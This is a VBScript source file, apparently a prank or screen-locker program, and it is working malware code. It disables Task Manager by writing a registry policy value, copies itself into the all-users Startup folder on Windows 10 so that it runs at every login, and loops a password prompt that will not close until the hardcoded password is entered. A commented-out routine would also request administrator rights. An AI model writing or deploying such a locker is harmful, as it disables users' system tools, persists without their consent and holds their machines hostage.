Set WShell = CreateObject("Wscript.Shell")
Set FileSysObj = CreateObject("Scripting.FileSystemObject")
'RunAsAdmin()
GetWindowsVersion()
DisableTaskMgr()
WillNotStopAsking = True

While WillNotStopAsking
	PINCode = InputBox("Please enter the password to proceed", "Password Pwease")
	Result = StrComp("appels", PINCode, vbTextCompare)
	If (Result = 0) Then
		WillNotStopAsking = False
		EnableTaskMgr()
		If FileSysObj.FileExists("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\VBScript.vbs") Then
			FileSysObj.DeleteFile("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\VBScript.vbs")
		End If
	Else
		For i = 0 to 2
			WShell.Popup "Say the magic word!", 1, "Say the magic word!", 48
		Next
	End If
Wend

Function DisableTaskMgr()
	WShell.Run "Reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", 0, 1
End Function

Function EnableTaskMgr()
	WShell.Run "Reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f", 0, 1
End Function

Function GetWindowsVersion()
	strComputer = "."
	Set dtmConvertedDate = CreateObject("WbemScripting.SWbemDateTime")
	Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
	Set oss = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
	strPath = WShell.CurrentDirectory + "\VBScript.vbs"
	For Each os in oss
		OSversion = Left(os.Version, 3)
		Select Case OSversion
			Case "10."
				If FileSysObj.FileExists ("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\VBScript.vbs") = False Then
					CopyFile strPath, "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" 
				End If
			Case "6.3"
				MsgBox "Windows 8.1"
			Case "6.2"
				MsgBox "Windows 8"
			Case "6.1"
				MsgBox "Windows 7"				
		End Select
	Next
End Function

Function CopyFile(Source, Destination)
	FileSysObj.CopyFile Source, Destination
End Function

'This code was provided by SimplyCoded
'This function asks the user if they want to run the program, this will be required for the DisableTaskMgr function.
'Function RunAsAdmin()
' Dim objAPP
'  If WScript.Arguments.length = 0 Then
'	Set objAPP = CreateObject("Shell.Application")
'	objAPP.ShellExecute "wscript.exe", """" & _
'	WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
'	WScript.Quit
'  End If
'End Function
